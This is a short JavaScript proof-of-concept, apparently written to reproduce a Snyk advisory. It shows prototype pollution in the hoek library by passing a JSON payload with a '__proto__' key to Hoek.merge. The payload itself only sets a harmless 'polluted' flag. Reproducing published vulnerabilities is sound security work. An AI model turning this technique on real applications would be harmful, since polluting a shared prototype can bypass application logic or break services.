//https://snyk.io/vuln/npm:hoek:20180212
    const Hoek = require('hoek');
    obj = {}
    let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

    Hoek.merge({}, JSON.parse(malicious_payload));
  